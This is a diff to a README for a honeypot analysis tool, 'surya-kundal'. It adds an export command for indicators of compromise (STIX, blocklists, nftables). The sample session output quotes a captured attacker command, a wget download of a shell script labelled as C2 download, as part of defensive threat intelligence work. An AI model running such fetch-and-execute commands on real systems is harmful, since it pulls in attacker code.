@@ -115,6 +115,7 @@ surya-kundal show <session-id>    # one session: commands with their techniques
 surya-kundal dashboard            # read-only web UI
 surya-kundal doctor               # check the installation; exit code 1 on failure
 surya-kundal wazuh-rules          # generate the Wazuh rules
+surya-kundal export               # indicators of compromise (CSV, STIX 2.1, blocklist, nftables)
 ```
 
 Example output:
@@ -131,6 +132,16 @@ Session 051b29d11c6c from 203.0.113.7 at 2026-10-05 07:11:23 UTC
       -> T1087.001 discovery-local-accounts (high)
   $ wget http://example.com/test/sh
       -> T1105 c2-download (high)
+```
+
+### Sharing what you learn
+
+`surya-kundal export` turns the database into indicators other tools can use: attacker addresses, file hashes and download URLs, each with first and last sighting, a confidence score, geography and the ATT&CK techniques seen. See [`docs/IOC_EXPORT.md`](docs/IOC_EXPORT.md) for the formats, the confidence rules and the safety rules.
+
+```bash
+surya-kundal export --format stix --output iocs.json          # STIX 2.1 for MISP, OpenCTI and others
+surya-kundal export --format nftables --output block.nft      # firewall set whose entries expire
+surya-kundal export --format blocklist --exclude 203.0.113.0/24
 ```
 
 ## Configuration
